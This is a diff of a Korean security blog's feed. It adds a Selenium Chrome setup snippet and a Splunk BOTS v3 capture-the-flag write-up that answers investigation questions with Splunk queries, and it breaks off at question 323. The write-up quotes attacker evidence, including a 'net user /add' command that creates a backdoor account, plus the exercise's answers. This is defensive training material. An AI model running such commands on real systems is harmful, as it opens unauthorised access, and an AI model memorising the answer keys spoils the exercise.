+    &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;
+    크롭 웹드라이버 인스턴스 생성
+
+    :param driver_path: 드라이버 경로
+    :param download_path: 파일 다운로드 경로
+    :param headless: headless 옵션 설정 플래그
+    :return webdriver: 크롬 드라이버 인스턴스
+    &quot;&quot;&quot;&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;options&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;webdriver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ChromeOptions&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;headless&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add_argument&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'headless'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add_argument&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'--disable-gpu'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add_experimental_option&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'prefs'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;'download.default_directory'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;download_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;'download.prompt_for_download'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;&quot;profile.default_content_settings.popups&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;&quot;safebrowsing.enabled&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;chrome&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;webdriver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Chrome&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;executable_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;driver_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;headless&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;_enable_download_in_headless_chrome&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;chrome&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;download_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;atexit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;register&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_close_chrome&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;chrome&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;       &lt;span class=&quot;c1&quot;&gt;# 스크립트 종료전 무조건 크롬 종료
+&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chrome&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;인스턴스-생성&quot;&gt;인스턴스 생성&lt;/h3&gt;
+
+&lt;p&gt;크롬 브라우저 기동 기능은 완료했습니다. 이제 자동화 기능을 구현만 남았습니다.&lt;/p&gt;
 
 &lt;p&gt;github 주소 (https://github.com/wind-flow/avdownload)&lt;/p&gt;</content>
 
@@ -415,6 +491,765 @@ NFT를 이해하기위해선 &lt;strong&gt;Fungible&lt;/strong&gt;의 뜻을 이
 
       
         <summary type="html">2021 BOTS 결과</summary>
+      
+
+      
+      
+    </entry>
+  
+    <entry>
+      <title type="html">splunk4Rookie:Soar</title>
+      <link href="https://wind-flow.github.io/splunk-SOAR-rookie" rel="alternate" type="text/html" title="splunk4Rookie:Soar" />
+      <published>2021-11-03T23:28:36+09:00</published>
+      <updated>2021-11-03T23:28:36+09:00</updated>
+      <id>https://wind-flow.github.io/splunk-SOAR-rookie</id>
+      <content type="html" xml:base="https://wind-flow.github.io/splunk-SOAR-rookie">&lt;h1 id=&quot;splunk4rookie-soar&quot;&gt;Splunk4Rookie: SOAR&lt;/h1&gt;</content>
+
+      
+      
+      
+      
+      
+
+      <author>
+          <name>Kim-Gunwoo</name>
+        
+        
+      </author>
+
+      
+
+      
+        <category term="splunk" />
+      
+        <category term="soar" />
+      
+        <category term="soc" />
+      
+        <category term="automation" />
+      
+
+      
+        <summary type="html">Splunk4Rookie: SOAR</summary>
+      
+
+      
+      
+    </entry>
+  
+    <entry>
+      <title type="html">splunk-bots-v3 write up(4) - END</title>
+      <link href="https://wind-flow.github.io/splunk-BOTS-v3-part4" rel="alternate" type="text/html" title="splunk-bots-v3 write up(4) - END" />
+      <published>2021-10-05T20:04:36+09:00</published>
+      <updated>2021-10-05T20:04:36+09:00</updated>
+      <id>https://wind-flow.github.io/splunk-BOTS-v3-part4</id>
+      <content type="html" xml:base="https://wind-flow.github.io/splunk-BOTS-v3-part4">&lt;p&gt;&lt;span class=&quot;table-of-contents-list&quot;&gt;Splunk BOTS의 데이터셋은 3개입니다.&lt;/span&gt;&lt;/p&gt;
+&lt;ul class=&quot;table-of-contents-list&quot;&gt;
+  &lt;li&gt;&lt;a href=&quot;./splunk-BOTS-overview&quot;&gt;BOTS란? &lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;./splunk-BOTS-v1-part1&quot;&gt;BOTS v1 Write up(1)&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;./splunk-BOTS-v1-part2&quot;&gt;BOTS v1 Write up(2) - END&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;./splunk-BOTS-v2-part1&quot;&gt;BOTS v2 Write up(1) &lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;./splunk-BOTS-v2-part2&quot;&gt;BOTS v2 Write up(2) &lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;./splunk-BOTS-v2-part3&quot;&gt;BOTS v2 Write up(3) &lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;./splunk-BOTS-v2-part4&quot;&gt;BOTS v2 Write up(4) &lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;./splunk-BOTS-v2-part5&quot;&gt;BOTS v2 Write up(5) - END&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;./splunk-BOTS-v3-part1&quot;&gt;BOTS v3 Write up(1)&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;./splunk-BOTS-v3-part2&quot;&gt;BOTS v3 Write up(2)&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;./splunk-BOTS-v3-part3&quot;&gt;BOTS v3 Write up(3)&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;./splunk-BOTS-v3-part4&quot;&gt;BOTS v3 Write up(4) - END&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;./splunk-2021-BOTS-END&quot;&gt;BOTS v4 결과&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;secnario #1&lt;br /&gt;
+Note: All the information you need to answer each question is present within the question itself. You just need to figure out how to create the proper splunk search query that will get you the information you want.&lt;br /&gt;
+각 질문에 답하는 데 필요한 모든 정보는 질문 자체에 있습니다. 원하는 정보를 얻을 수 있는 적절한 splunk 검색 쿼리를 생성하는 방법을 알아내기만 하면 됩니다.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;BOTS-V3&lt;/p&gt;
+
+&lt;p&gt;index=botsv3의 sourcetype은 아래와 같습니다.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;| metadata type=sourcetypes index=botsv3
+| stats values(sourcetype)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;ul&gt;
+  &lt;li&gt;sourcetype 목록&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;values(sourcetype)&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;PerfmonMk:Process&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Script:GetEndpointInfo&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Script:InstalledApps&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Script:ListeningPorts&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Unix:ListeningPorts&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Unix:SSHDConfig&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Unix:Service&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Unix:Update&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Unix:Uptime&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Unix:UserAccounts&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Unix:Version&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;WinHostMon&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;access_combined&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;alternatives&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;amazon-ssm-agent&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;amazon-ssm-agent-too_small&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;apache_error&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;aws:cloudtrail&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;aws:cloudwatch&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;aws:cloudwatch:guardduty&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;aws:cloudwatchlogs&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;aws:cloudwatchlogs:vpcflow&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;aws:config:rule&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;aws:description&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;aws:elb:accesslogs&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;aws:rds:audit&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;aws:rds:error&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;aws:s3:accesslogs&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;bandwidth&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;bash_history&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;bootstrap&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;cisco:asa&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;cloud-init&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;cloud-init-output&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;code42:api&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;code42:computer&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;code42:org&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;code42:security&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;code42:user&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;config_file&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;cpu&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;cron-too_small&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;df&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;dmesg&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;dpkg&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;error-too_small&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;errors&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;errors-too_small&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;ess_content_importer&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;hardware&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;history-2&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;interfaces&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;iostat&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;lastlog&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;linux_audit&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;linux_secure&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;localhost-5&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;lsof&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;maillog-too_small&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;ms:aad:audit&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;ms:aad:signin&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;ms:o365:management&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;ms:o365:reporting:messagetrace&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;netstat&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;o365:management:activity&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;openPorts&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;osquery:info&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;osquery:results&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;osquery:warning&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;out-3&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;package&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;protocol&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;ps&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;stream:arp&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;stream:dhcp&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;stream:dns&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;stream:http&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;stream:icmp&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;stream:igmp&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;stream:ip&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;stream:mysql&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;stream:smb&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;stream:smtp&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;stream:tcp&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;stream:udp&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;symantec:ep:agent:file&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;symantec:ep:agt_system:file&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;symantec:ep:behavior:file&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;symantec:ep:packet:file&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;symantec:ep:risk:file&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;symantec:ep:scm_system:file&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;symantec:ep:security:file&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;symantec:ep:traffic:file&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;syslog&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;time&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;top&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;usersWithLoginPrivs&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;vmstat&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;who&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;wineventlog&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;xmlwineventlog&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;yum-too_small&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;318	From what country is a small brute force or password spray attack occurring against the Frothly web servers?&lt;br /&gt;
+Frothly 웹 서버에 대해 소규모 무차별 대입 공격 또는 암호 스프레이 공격이 어느 국가에서 발생합니까?&lt;/p&gt;
+&lt;details&gt;
+  &lt;summary&gt;hint#1&lt;/summary&gt;
+    Use linux_secure as the sourcetype.
+    sourcetype linux_secure에서 조사하세요.
+&lt;/details&gt;
+
+&lt;p&gt;힌트에서 sourcetype linux_secure에 답이있다고 알려줍니다.
+&lt;a href=&quot;https://splunkbase.splunk.com/app/3476/&quot;&gt;linux_secure&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;vendor_action필드에 &lt;strong&gt;Invalid user&lt;/strong&gt;란 값이있으니 조건을 추가해봅니다.&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sourcetype=linux_secure vendor_action=&quot;Invalid user&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;해당 로그에서 발견한 IP는 &lt;strong&gt;5.101.40.81&lt;/strong&gt;입니다.&lt;/p&gt;
+
+&lt;p&gt;whois에 검색해봅시다.
+&lt;img src=&quot;https://wind-flow.github.io/assets/built/images/splunk/bots/v3/2021-11-01-15-28-35.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;해당 IP국가는 러시아입니다.&lt;/p&gt;
+
+&lt;p&gt;답 : RUSSIA&lt;/p&gt;
+
+&lt;p&gt;319	The adversary created a BCC rule to forward Frothly’s email to his personal account. What is the value of the “Name” parameter set to?&lt;br /&gt;
+공격자는 Frothly의 이메일을 자신의 개인 계정으로 전달하는 BCC 규칙을 만들었습니다. “Name” 매개변수의 값은 무엇으로 설정되어 있습니까?&lt;/p&gt;
+&lt;details&gt;
+  &lt;summary&gt;hint#1&lt;/summary&gt;
+    Use ms:o365:management as the sourcetype.
+    sourcetype ms:o365:management에서 조사하세요.
+&lt;/details&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://bluemail.help/ko/myself-bcc-automatically/&quot;&gt;BCC룰이란?&lt;/a&gt;
+BCC는 숨은참조입니다. 숨은참조 룰을 찾아봅시다.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sourcetype=ms:o365:management *Frothly* *Name* (*bcc* OR *Rule* OR *Blind*Carbon*Copy*)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://wind-flow.github.io/assets/built/images/splunk/bots/v3/2021-11-01-16-01-27.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;공격자의 메일주소 hyunki1984@naver.com로 BlindCopyTo를 보내는 &lt;strong&gt;New-TransportRule&lt;/strong&gt;룰을 생기는 이벤트입니다.&lt;/p&gt;
+
+&lt;p&gt;답 : SOX&lt;/p&gt;
+
+&lt;p&gt;320	What is the password for the user that was created on the compromised endpoint?&lt;br /&gt;
+손상된 엔드포인트에서 생성된 사용자의 비밀번호는 무엇입니까?&lt;/p&gt;
+&lt;details&gt;
+  &lt;summary&gt;hint#1&lt;/summary&gt;
+    Use WinEventLog:Security as the sourcetype.
+    sourcetype WinEventLog:Security에서 조사하세요.
+&lt;/details&gt;
+
+&lt;p&gt;svcvnc를 키워드로 검색하면 아래와 같은 이벤트를 발견할 수 있습니다.&lt;/p&gt;
+
+&lt;p&gt;Process Command Line:	C:\Windows\system32\net1 user /add svcvnc Password123!&lt;/p&gt;
+
+&lt;p&gt;답 : Password123!&lt;/p&gt;
+
+&lt;p&gt;321	The Taedonggang adversary sent Grace Hoppy an email bragging about the successful exfiltration of customer data. How many Frothly customer emails were exposed or revealed?&lt;br /&gt;
+대동강은 Grace Hoppy에게 성공적인 고객 데이터 유출에 대해 자랑하는 이메일을 보냈습니다. 얼마나 많은 Frothly 고객 이메일이 노출되거나 공개되었습니까?&lt;/p&gt;
+&lt;details&gt;
+  &lt;summary&gt;hint#1&lt;/summary&gt;
+    Use stream:smtp as the sourcetype.
+    sourcetype stream:smtp에서 조사하세요.
+&lt;/details&gt;
+
+&lt;p&gt;Grace Hoppy의 이메일주소는 &lt;strong&gt;ghoppy@froth.ly&lt;/strong&gt;입니다.
+smtp에서 수신자 ghoppy@froth.ly인 이벤트를 찾아봅시다.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sourcetype=stream:smtp receiver_email{}=ghoppy@froth.ly
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;sender_email이 &lt;strong&gt;hyunki1984@naver.com&lt;/strong&gt;인 이벤트가 1개있습니다.
+base64인코딩된 데이터를 디코딩해봅시다.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;R3JhY2llLAoKICAgICAgIFdlIGJyb3VnaHQgeW91ciBkYXRhIGFuZCBpbXBvcnRlZCBpdDogaHR0
+cHM6Ly9wYXN0ZWJpbi5jb20vc2RCVWt3c0UgQWxzbywgeW91IHNob3VsZCBub3QgYmUgdG9vIGhh
+cmQgQnJ1Y2UuIEhlIGdvb2QgbWFuIAogCiAKIAogCg==
+(Decoding)→
+Gracie,
+We brought your data and imported it: https://pastebin.com/sdBUkwsE Also, you should not be too hard Bruce. He good man 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;해당 url로 가보면 총 8명입니다.
+&lt;img src=&quot;https://wind-flow.github.io/assets/built/images/splunk/bots/v3/2021-11-01-16-17-11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;답 : 8&lt;/p&gt;
+
+&lt;p&gt;322	What is the path of the URL being accessed by the command and control server? Answer guidance: Provide the full path. (Example: The full path for the URL https://imgur.com/a/mAqgt4S/lasd3.jpg is /a/mAqgt4S/lasd3.jpg)
+명령 및 제어 서버가 액세스하는 URL의 경로는 무엇입니까? 답변 안내: 전체 경로를 제공하세요. (예: https://imgur.com/a/mAqgt4S/lasd3.jpg URL의 전체 경로는 /a/mAqgt4S/lasd3.jpg입니다.)&lt;/p&gt;
+&lt;details&gt;
+  &lt;summary&gt;hint#1&lt;/summary&gt;
+    Start with XmlWinEventLog:Microsoft-Windows-Sysmon/Operational as the sourcetype, or review the PowerShell logging on various Frothly laptops.
+    XmlWinEventLog:Microsoft-Windows-Sysmon/Operational을 소스 유형으로 시작하거나 다양한 Frothly 랩톱에서 PowerShell 로깅을 검토합니다.
+&lt;/details&gt;
+
+&lt;p&gt;323	At least two Frothly endpoints contact the adversary’s command and control infrastructure. What are their short hostnames? Answer guidance: Comma separated without spaces, in alphabetical order.&lt;br /&gt;
